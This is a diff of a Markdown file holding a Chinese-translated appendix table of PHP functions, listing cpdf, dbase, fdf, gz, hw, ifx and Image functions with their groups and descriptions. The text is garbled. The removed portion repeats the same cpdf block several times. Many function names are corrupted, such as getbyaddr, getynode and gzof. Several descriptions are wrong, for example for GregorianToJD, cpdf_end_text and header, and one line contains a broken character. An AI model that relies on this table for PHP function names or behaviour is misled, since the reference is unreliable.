-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| dblist | DBM | 描述使用的 dbm 兼容库 |
-| delete | FILESY | 仅的的占符手册条目 |
-| crypt | STRING | 加密字符串 |
-| current | ARRAY | 返回数组中的当前元素 |
-| date | DATETIME | 格式化本地时间 |
-| dbase_add_record | DATABASE | 向 dBase 添加记录 |
-| dbase_close | DATABASE | 关闭 dBase 数据库 |
-| dbase_create | DATABASE | 创建 dBase 数据库 |
-| dbase_delete_record | DATABASE | 从 dBase 数据库删除记录 |
-| dbase_get_record | DATABASE | 获取 dBase 中的记录 |
-| dbase_numfields | DATABASE | 查找 dBase 中的字段数量 |
-| dbase_numrecords | DATABASE | 查找 dBase 中的记录 |
-| dbase_open | DATABASE | 打开 dBase 数据库 |
-| dbase_pack | DATABASE | 打包 dBase 数据库 |
-| dbase_replace_record | DATABASE | 替换 dBase 中的记录 |
-| dba_close | DBA | 关闭数据库 |
-| dba_delete | DBA | 删除项 |
-| dba_exists | DBA | 检查键是否存在 |
-| dba_fetch | DBA | 通过键获取数据 |
-| dba_firstkey | DBA | 获取第一个键 |
-| dba_insert | DBA | 插入项 |
-| dba_nextkey | DBA | 获取下一个键 |
-| dba_open | DBA | 打开数据库 |
-| dba_optimize | DBA | 优化数据库 |
-| dba_popen | DBA | 持久打开数据库 |
-| dba_replace | DBA | 替换或插入 |
-| dba_sync | DBA | 同步数据库 |
 
 ## 附录 D
 
 ## 表 D.1 按照字母顺序排列的 PHP 函数（续）
 
 | 函数名 | 分组名称 | 描述 |
+
 | :--- | :--- | :--- |
+
+| dblist | DBM | 描述使用的 dbm 兼容库 |
+
+| delete | FILESY | 仅的的占符手册条目 |
+
+| crypt | STRING | 加密字符串 |
+
+| current | ARRAY | 返回数组中的当前元素 |
+
+| date | DATETIME | 格式化本地时间 |
+
+| dbase_add_record | DATABASE | 向 dBase 添加记录 |
+
+| dbase_close | DATABASE | 关闭 dBase 数据库 |
+
+| dbase_create | DATABASE | 创建 dBase 数据库 |
+
+| dbase_delete_record | DATABASE | 从 dBase 数据库删除记录 |
+
+| dbase_get_record | DATABASE | 获取 dBase 中的记录 |
+
+| dbase_numfields | DATABASE | 查找 dBase 中的字段数量 |
+
+| dbase_numrecords | DATABASE | 查找 dBase 中的记录 |
+
+| dbase_open | DATABASE | 打开 dBase 数据库 |
+
+| dbase_pack | DATABASE | 打包 dBase 数据库 |
+
+| dbase_replace_record | DATABASE | 替换 dBase 中的记录 |
+
+| dba_close | DBA | 关闭数据库 |
+
+| dba_delete | DBA | 删除项 |
+
+| dba_exists | DBA | 检查键是否存在 |
+
+| dba_fetch | DBA | 通过键获取数据 |
+
+| dba_firstkey | DBA | 获取第一个键 |
+
+| dba_insert | DBA | 插入项 |
+
+| dba_nextkey | DBA | 获取下一个键 |
+
+| dba_open | DBA | 打开数据库 |
+
+| dba_optimize | DBA | 优化数据库 |
+
+| dba_popen | DBA | 持久打开数据库 |
+
+| dba_replace | DBA | 替换或插入 |
+
+| dba_sync | DBA | 同步数据库 |
+
+## 表 D.1 按照字母顺序排列的 PHP 函数（续）
+
+| 函数名 | 分组名称 | 描述 |
+
+| :--- | :--- | :--- |
+
 | DecBin | MATH | 十进制转二进制 |
+
 | DecHex | MATH | 十进制转十六进制 |
+
 | DecOct | MATH | 十进制转八进制 |
+
 | delete | FILESY | 仅的占位符手册条目 |
+
 | die | MISC | 输出消息并终止当前脚本 |
+
 | dir | DIR | 目录类 |
+
 | dirname | FILESY | 返回路径的目录部分 |
+
 | diskfreespace | FILESY | 返回目录中的可用空间 |
+
 | dl | DL | 在运行时加载 PHP 扩展 |
+
 | doubleval | VAR | 获取变量的浮点数值 |
-
-
-
-
 
 ## 表 D.1 按字母顺序排列的 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 描述 |
+
 |---|---|---|
+
 | each | ARRAY | 从数组中返回下一个键值对 |
+
 | easter_date | CALENDAR | 获取指定年份复活节午夜的 UNIX 时间戳 |
+
 | easter_days | CALENDAR | 获取指定年份中复活节在 3 月 21 日之后的天数 |
+
 | echo | STRINGS | 输出一个或多个字符串 |
+
 | empty | VAR | 确定变量是否已设置 |
+
 | end | ARRAY | 将数组的内部指针设置为其最后一个元素 |
+
 | ereg | REGEX | 正则表达式匹配 |
+
 | eregi | REGEX | 不区分大小写的正则表达式匹配 |
+
 | eregi_replace | REGEX | 不区分大小写的正则表达式替换 |
+
 | ereg_replace | REGEX | 正则表达式替换 |
+
 | error_log | INFO | 向某处发送错误消息 |
+
 | error_reporting | INFO | 设置报告哪些 PHP 错误 |
+
 | escapeshellcmd | EXEC | 转义 shell 元字符 |
+
 | eval | MISC | 将字符串求视为 PHP 代码 |
+
 | exec | EXEC | 执行外部程序 |
+
 | exit | MISC | 终止当前脚本 |
+
 | Exp | MATH | e 的幂次方... |
+
 | explode | STRINGS | 用字符串分割字符串 |
+
 | extension_loaded | INFO | 查找扩展是否已加载 |
+
 | extract | MISC | 将数组中的变量导入符号表 |
+
 | fclose | FILESY | 关闭已打开的文件指针 |
+
 | fdf_close | FDF | 关闭 FDF 文档 |
+
 | fdf_create | FDF | 创建新的 FDF 文档 |
+
 | fdf_get_file | FDF | 获取 /F 键的值 |
 
 ## 附录 D
@@ -14133,30 +15477,55 @@ echo "</ul>";
 ## 表 D.1 按字母顺序排列的 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 描述 |
+
 |---|---|---|
+
 | fdf_get_status | FDF | 获取 /STATUS 键的值 |
+
 | fdf_get_value | FDF | 获取字段的值 |
+
 | fdf_next_field_name | FDF | 获取下一个字段名 |
+
 | fdf_open | FDF | 打开 FDF 文档 |
+
 | fdf_save | FDF | 保存 FDF 文档 |
+
 | fdf_set_ap | FDF | 设置字段的外观 |
+
 | fdf_set_file | FDF | 设置 /F 键的值 |
+
 | fdf_set_status | FDF | 获取 /STATUS 键的值 |
+
 | fdf_set_value | FDF | 获取字段的值 |
+
 | feof | FILESYSTEM | 测试文件指针是否到达结束 |
+
 | fgetc | FILESYSTEM | 从文件指针获取字符 |
+
 | fgetcsv | FILESYSTEM | 从文件指针获取行并解析为 CSV 字段 |
+
 | fgets | FILESYSTEM | 从文件指针获取行 |
+
 | getss | FILESYSTEM | 从文件指针获取行并去除 HTML 标签 |
+
 | file | FILESYSTEM | 将整个文件读入数组 |
+
 | fileime | FILESYSTEM | 获取文件的最后访问时间 |
+
 | filetime | FILESYSTEM | 获取文件的 inode 更改时间 |
+
 | filegroup | FILESYSTEM | 获取文件组 |
+
 | fileinode | FILESYSTEM | 获取文件 inode |
+
 | filemtime | FILESYSTEM | 获取文件修改时间 |
+
 | fileowner | FILESYSTEM | 获取文件所有者 |
+
 | fileperms | FILESYSTEM | 获取文件权限 |
+
 | filepro | FILEPRO | 读取并验证映射文件 |
+
 | filepro_fieldcount | FILEPRO | 获取 filePro 数据库中包含多少字段 |
 
 （续）
@@ -14164,294 +15533,324 @@ echo "</ul>";
 ## 表 D.1 按字母顺序排列的 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 描述 |
+
 |---|---|---|
+
 | filepro_fieldname | FILEPRO | 获取字段名 |
+
 | filepro_fieldtype | FILEPRO | 获取字段类型 |
+
 | filepro_fieldwidth | FILEPRO | 获取字段宽度 |
+
 | filepro_retrieve | FILEPRO | 从 filePro 数据库中检索数据 |
+
 | filepro_rowcount | FILEPRO | 查找 filePro 数据库中有多少行 |
+
 | filesize | FILESYSTEM | 获取文件大小 |
+
 | filetype | FILESYSTEM | 获取文件类型 |
+
 | file_exists | FILESYSTEM | 检查文件是否存在 |
-| flock | FILESYSTEM | 可移植的建议性文件锁定
+
+| flock | FILESYSTEM | 可移植的建议性文件锁定 |
+
 | Floor | MATH | 向下舍取整 |
+
 | flush | STRINGS | 刷新输出缓冲区 |
+
 | fopen | FILESYSTEM | 打开文件或 URL |
+
 | fpassthru | FILESYSTEM | 输出文件指针上的所有剩余数据 |
+
 | fputs | FILESYSTEM | 写入文件指针 |
+
 | fread | FILESYSTEM | 二进制安全的文件读取 |
+
 | FrenchToJD | CALENDAR | 将法国共和历日期转换为儒日计数 |
+
 | fseek | FILESYSTEM | 在文件指针上移动 |
+
 | fsockopen | NETWORK | 打开 Internet 或 UNIX 域套接连接 |
+
 | ftell | FILESYSTEM | 告诉指针读写位置 |
+
 | function_exists | MISC | 如果给函数已定义则返回 true |
+
 | fwrite | FILESYSTEM | 二进制安全的文件写入 |
+
 | getallheaders | APACHE | 获取所有 HTTP 请求头 |
+
 | getdate | DATETIME | 获取日期/时间信息 |
+
 | getenv | INFO | 获取环境变量的值 |
 
 ## 表 D.1 按字母顺序排列的 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 描述 |
+
 |---|---|---|
+
 | getallheaders | APACHE | 获取所有 HTTP 请求头 |
+
 | getdate | DATETIME | 获取日期/时间信息 |
+
 | getenv | INFO | 获取环境变量的值 |
 
 ## 表 D.1 按字母顺序排列的 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 描述 |
+
 |---|---|---|
+
 | getbyaddr | NETWORK | 获取对应 IP 地址的主机 |
+
 | getbyname | NETWORK | 获取对应主机名的 IP 地址 |
+
 | getbyb | NETWORK | 获取对应 Internet 的主机名 |
-| getSize | IMAGE | 获取 GIF、JPG 或 PNG 的大小 |
+
+| getSize | IMAGE | 获取 GIF、JPG 或 PNG 的大量 |
+
 | getlast | INFO | 获取最后的修改时间 |
+
 | getmx | NETWORK | 获取对应 MX 的主机 |
+
 | getynode | INFO | 获取脚本的 inode |
+
 | getmypid | INFO | 获取脚本的 ID |
+
 | getmyuid | INFO | 获取所有者的 UID |
+
 | getrand | MATH | 获取最大的随机数 |
+
 | getrusage | INFO | 获取使用情况 |
+
 | gettimeday | DATETIME | 获取时间 |
+
 | gettype | VAR | 获取变量类型 |
+
 | get_cfg | INFO | 获取配置 |
-| getsettings | INFO | 获取设置
-| getmeta | INFO | 获取元数据
+
+| getsettings | INFO | 获取设置 |
+
+| getmeta | INFO | 获取元数据 |
+
 | gettime | DATETIME | 获取时间 |
+
 | getdate | CALENDAR | 获取日期 |
-| gmkdate | CALENDAR | 获取 GMT 日期
+
+| gmkdate | CALENDAR | 获取 GMT 日期 |
 
 ## 表 D.1 按字母顺序排列的（续）
 
 | 函数名称 | 分组名称 | 描述 |
+
 |---|---|---|
+
 | GregorianToJD | CALENDAR | 将法国共和历日期转换为儒日计数 |
-| gzclose | ZLIB | 关闭文件指针
-| gzof | ZLIB | 测试文件指针是否到达结束
-| gzfile | ZLIB | 将整个文件读入数组
+
+| gzclose | ZLIB | 关闭文件指针 |
+
+| gzof | ZLIB | 测试文件指针是否到达结束 |
+
+| gzfile | ZLIB | 将整个文件读入数组 |
+
 | gzgetc | ZLIB | 从文件指针获取字符 |
-| gzgets | ZLIB | 从文件指针获取行
-| gzss | ZLIB | 获取行并去除 HTML 标签
-| gzopen | ZLIB | 打开文件指针
-| gzpassthru | ZLIB | 输出所有剩余数据
-| gzputs | ZLIB | 写入文件指针
-| gzread | ZLIB | 二进制安全的文件读取
-| gzseek | ZLIB | 在文件指针上移动
-| gtell | ZLIB | 告诉指针读写位置
-| gzwrite | ZLIB | 二进制安全的文件写入
-| header | APACHE | 获取所有 HTTP 请求头
+
+| gzgets | ZLIB | 从文件指针获取行 |
+
+| gzss | ZLIB | 获取行并去除 HTML 标签 |
+
+| gzopen | ZLIB | 打开文件指针 |
+
+| gzpassthru | ZLIB | 输出所有剩余数据 |
+
+| gzputs | ZLIB | 写入文件指针 |
+
+| gzread | ZLIB | 二进制安全的文件读取 |
+
+| gzseek | ZLIB | 在文件指针上移动 |
+
+| gtell | ZLIB | 告诉指针读写位置 |
+
+| gzwrite | ZLIB | 二进制安全的文件写入 |
+
+| header | APACHE | 获取所有 HTTP 请求头 |
+
 | HexDec | MATH | 将十六进制转换为十进制 |
-| htmlentities | STRINGS | 将字符转换为 HTML 实体
-| htmlspecialchars | STRINGS | 将特殊字符转换为 HTML 实体
-| hw_Children | HW | 获取子节点的 ID
-| hw_ChildrenObj | HW | 获取子节点的记录
-| hw_Close | HW | 关闭连接
-| hw_Connect | HW | 打开连接
-| hw_Cp | HW | 拷贝对象
+
+| htmlentities | STRINGS | 将字符转换为 HTML 实体 |
+
+| htmlspecialchars | STRINGS | 将特殊字符转换为 HTML 实体 |
+
+| hw_Children | HW | 获取子节点的 ID |
+
+| hw_ChildrenObj | HW | 获取子节点的记录 |
+
+| hw_Close | HW | 关闭连接 |
+
+| hw_Connect | HW | 打开连接 |
+
+| hw_Cp | HW | 拷贝对象 |
 
 ## 表 D.1 按字母顺序排列的（续）
 
 | 函数名称 | 分组名称 | 描述 |
+
 |---|---|---|
-| hw_Deleteobject | HW | 删除对象
-| hw_DocByAnchor | HW | 属于锚点的文档 ID
-| hw_DocByAnchorObj | HW | 属于锚点的对象记录
-| hw_DocumentAttributes | HW | hw_document 的属性
-| hw_DocumentBodyTag | HW | hw_document 的主体标签
-| hw_DocumentContent | HW | 获取 hw_document 的内容
-| hw_DocumentSetContent | HW | 设置/替换 hw_document 的内容
-| hw_DocumentSize | HW | hw_document 的大小
-| hw_EditText | HW | 检索文本文档
-| hw_Error | HW | 错误数量
-| hw_ErrorMsg | HW | 返回错误消息
-| hw_Free_Document | HW | 释放 hw_document
-| hw_GetAnchors | HW | 文档锚点的 ID
-| hw_GetAnchorsObj | HW | 文档锚点的记录
-| hw_GetAndLock | HW | 返回对象记录并锁定对象
-| hw_GetChildColl | HW | 子集合的 ID
-| hw_GetChildCollObj | HW | 子集合的记录
-| hw_GetChildDocColl | HW | 集合子文档的 ID
-| hw_GetChildDocCollObj | HW | 集合子文档的记录
-| hw_GetObject | HW | 对象记录
-| hw_GetObjectByQuery | HW | 搜索对象
-| hw_GetObjectByQuery-Coll | HW | 在集合中搜索对象
-| hw_GetObjectByQuery-CollObj | HW | 在集合中搜索对象
 
+| hw_Deleteobject | HW | 删除对象 |
 
+| hw_DocByAnchor | HW | 属于锚点的文档 ID |
 
+| hw_DocByAnchorObj | HW | 属于锚点的对象记录 |
 
+| hw_DocumentAttributes | HW | hw_document 的属属性 |
+
+| hw_DocumentBodyTag | HW | hw_document 的主体标签 |
+
+| hw_DocumentContent | HW | 获取 hw_document 的内容 |
+
+| hw_DocumentSetContent | HW | 设置/替换 hw_document 的内容 |
+
+| hw_DocumentSize | HW | hw_document 的大小 |
+
+| hw_EditText | HW | 检索文本文档 |
+
+| hw_Error | HW | 错误数量 |
+
+| hw_ErrorMsg | HW | 返回错误消息 |
+
+| hw_Free_Document | HW | 释放 hw_document |
+
+| hw_GetAnchors | HW | 文档锚点的 ID |
+
+| hw_GetAnchorsObj | HW | 文档锚点的记录 |
+
+| hw_GetAndLock | HW | 返回对象记录并锁定对象 |
+
+| hw_GetChildColl | HW | 子集合的 ID |
+
+| hw_GetChildCollObj | HW | 子集合的记录 |
+
+| hw_GetChildDocColl | HW | 集合子文档的 ID |
+
+| hw_GetChildDocCollObj | HW | 集合子文档的记录 |
+
+| hw_GetObject | HW | 对象记录 |
+
+| hw_GetObjectByQuery | HW | 搜索对象 |
+
+| hw_GetObjectByQuery-Coll | HW | 在集合中搜索对象 |
+
+| hw_GetObjectByQuery-CollObj | HW | 在集合中搜索对象 |
 
 ## 表 D.1 按字母顺序排列 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 描述 |
+
 |---|---|---|
+
 | hw_GetObjectByQuery-Obj | HW | 搜索对象 |
+
 | hw_GetParents | HW | 父对象的对象 ID |
+
 | hw_GetParentsObj | HW | 父对象的对象记录 |
+
 | hw_GetRemote | HW | 获取远程文档 |
+
 | hw_GetRemoteChildren | HW | 获取远程文档的子节点 |
+
 | hw_GetSrcByDestObj | HW | 返回指向对象的锚点 |
+
 | hw_GetText | HW | 获取文本文档 |
+
 | hw_Identify | HW | 识别用户 |
+
 | hw_InCollections | HW | 检查对象 ID 是否在集合中 |
+
 | hw_Info | HW | 关于连接的信息 |
+
 | hw_InsColl | HW | 插入集合 |
+
 | hw_InsDoc | HW | 插入文档 |
+
 | hw_InsertDocument | HW | 上传任何文档 |
+
 | hw_InsertObject | HW | 插入一个对象记录 |
+
 | hw_Modifyobject | HW | 修改对象记录 |
+
 | hw_Mv | HW | 移动对象 |
+
 | hw_New_Document | HW | 创建新文档 |
+
 | hw_Objcrec2Array | HW | 将属性从对象记录转换为对象数组 |
+
 | hw_OutputDocument | HW | 打印 hw_document |
+
 | hw_pConnect | HW | 建立持久数据库连接 |
+
 | hw_PipeDocument | HW | 获取任何文档 |
+
 | hw_Root | HW | 根对象 ID |
-| hw_Unlock | HW | 解锁对象 |
+
+| hw_Unlock | HW | 解�对象 |
+
 | hw_Username | HW | 当前登录用户的名称 |
+
 | hw_Who | HW | 当前登录用户列表 |
+
 | ibase_close | IBASE | 关闭 ibase_close ibase_query |
 
 ## 表 D.1 按字母顺序排列 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 描述 |
+
 | ---|---|---|
+
 | ibase_connect | IBASE | 连接 ibase_connect ibase_pconnect |
+
 | ibase_execute | IBASE | 执行 ibase_execute ibase_free_query |
+
 | ibase_fetch_row | IBASE | 获取行 ibase_fetch_row ibase_free_result |
+
 | ibase_prepare | IBASE | 准备 ibase_prepare ibase_bind |
+
 | ifx_close_slob | IFX | 删除 slob 对象 |
+
 | ifx_create_slob | IFX | 创建并打开一个 slob 对象 |
+
 | ifx_open_slob | IFX | 打开一个 slob 对象 |
+
 | ifx_read_slob | IFX | 读取 slob 对象的 n 字节 |
+
 | ifx_seek_slob | IFX | 设置当前文件或寻求位置 |
+
 | ifx_tell_slob | IFX | 返回当前文件或寻求位置 |
+
 | ifx_write_slob | IFX | 向 slob 对象写入字符串 |
+
 | ifx_affected_rows | IFX | 获取受查询影响的行数 |
+
 | ifx_blobfile_mode | IFX | 为所有选择查询设置默认 blob 模式 |
+
 | ifx_bytesavarchar | IFX | 设置默认字节模式 |
+
 | ifx_close | IFX | 关闭 Informix 连接 |
+
 | ifx_connect | IFX | 打开 Informix 服务器连接 |
+
 | ifx_copy_blob | IFX | 复制指定的 blob 对象 |
+
 | ifx_create_blob | IFX | 创建一个 blob 对象 |
+
 | ifx_create_char | IFX | 创建一个 char 对象 |
+
 | ifx_do | IFX | 执行之前准备的 SQL 语句 |
+
 | ifx_error | IFX | 返回上次 Informix调用的错误代码 |
+
 | ifx_errormsg | IFX | 返回上次 Informix 调用的错误消息 |
-| ifx_fetch_row | IFX | 获取枚举数组形式的行 |
-| ifx_fieldproperties | IFX | SQL 属性列表
-
-## 表 D.1 按字母顺序排列 PHP 函数（续）
-
-| 函数名称 | 分组名称 | 描述 |
-|---|---|---|
-| ifx_fieldType | IFX | Informix 字段 |
-| ifx_free_blob | IFX | 删除 blob 对象 |
-| ifx_free_char | IFX | 删除 char 对象 |
-| ifx_free_result | IFX | 释放查询资源 |
-| ifx_free_slob | IFX | 删除 slob 对象 |
-| ifx_getsqlca | IFX | 获取 sqlca.errd[0..5] |
-| ifx_get_blob | IFX | 返回 blob 对象的内容 |
-| ifx_get_char | IFX | 返回 char 对象的内容 |
-| ifx_htmltbl_result | IFX | 将查询行格式化为 HTML 表格 |
-| ifx_nullformat | IFX | 设置默认返回值 |
-| ifx_num_fields | IFX | 查询的列数 |
-| ifx_num_rows | IFX | 查询的行数 |
-| ifx_pconnect | IFX | 建立持久 Informix 连接 |
-| ifx_prepare | IFX | 准备 SQL 语句 |
-| ifx_query | IFX | 发送 Informix 查询 |
-| ifx_textasvarchar | IFX | 设置默认文本模式 |
-| ifx_update_blob | IFX | 更新 blob 的内容 |
-| ifx_update_char | IFX | 更新 char 的内容 |
-| ignore_user_abort | MISC | 设置客户端中断 |
-| ImageArc | IMAGE | 绘制部分椭圆 |
-| ImageChar | IMAGE | 绘制字符 |
-| ImageCharUp | IMAGE | 垂直绘制字符 |
-| ImageColorAllocate | IMAGE | 为图像分配颜色 |
-| ImageColorAt | IMAGE | 获取像素颜色索引
-
-## 表 D.1 按字母顺序排列 PHP 函数（续）
-
-| 函数名称 | 分组名称 | 描述 |
-| ---|---|---|
-| ImageClosest | IMAGE | 获取最接近颜色索引 |
-| ImageColorExact | IMAGE | 获取指定颜色索引 |
-| ImageColorResolve | IMAGE | 获取指定颜色或备选 |
-| ImageColorSet | IMAGE | 设置调色板颜色 |
-| ImageColorsForIndex | IMAGE | 获取索引颜色 |
-| ImageColorsTotal | IMAGE | 查找调色板中的颜色数量 |
-| ImageColorTransparent | IMAGE | 定义透明色 |
-| ImageCopyResized | IMAGE | 复制并缩放图像部分 |
-| ImageCreate | IMAGE | 创建新图像 |
-| ImageCreateFromGif | IMAGE | 从文件创建新图像 |
-| ImageDashedLine | IMAGE | 绘制虚线 |
-| ImageDestroy | IMAGE | 销毁图像 |
-| ImageFill | IMAGE | 填充 |
-| ImageFilledPolygon | IMAGE | 绘制填充多边形 |
-| ImageFilledRectangle | IMAGE | 绘制填充矩形 |
-| ImageFillToBorder | IMAGE | 填充到特定颜色 |
-| ImageFontHeight | IMAGE | 获取字体高度 |
-| ImageFontWidth | IMAGE | 获取字体宽度 |
-| ImageGif | IMAGE | 输出图像到浏览器或文件 |
-| ImageInterlace | IMAGE | 启用或禁用交错 |
-| ImageLine | IMAGE | 绘制线条 |
-| ImageLoadFont | IMAGE | 加载新字体 |
-| ImagePolygon | IMAGE | 绘制多边形
-
-## 表 D.1 按字母顺序排列 PHP 函数（续）
-
-| 函数名称 | 分组名称 | 描述 |
-| ---|---|---|
-| ImagePSBBox | IMAGE | 使用 PostType 字体提供文本矩形边界 |
-| ImagePSCopyFont | IMAGE | 复制已加载字体以便修改 |
-| ImagePSEEncodeFont | IMAGE | 修改字体字符编码向量 |
-| ImagePSFreeFont | IMAGE | 释放 PostScript Type 1 字体占用的内存 |
-| ImagePSLoadFont | IMAGE | 从文件加载 PostScript Type 1 |
-| ImagePText | IMAGE | 使用 PostType 字体在图像上绘制文本字符串 |
-| ImageRectangle | IMAGE | 绘制矩形 |
-| ImageSetPixel | IMAGE | 设置单个像素 |
-| ImageString | IMAGE | 水平绘制字符串 |
-| ImageStringUp | IMAGE | 垂直绘制字符串 |
-| ImageSX | IMAGE | 获取图像宽度 |
-| ImageSY | IMAGE | 获取图像高度 |
-| ImageTTFBBox | IMAGE | 使用 TrueType 字体提供文本边界 |
-| ImageTTFText | IMAGE | 使用 TrueType 字体向图像写入文本 |
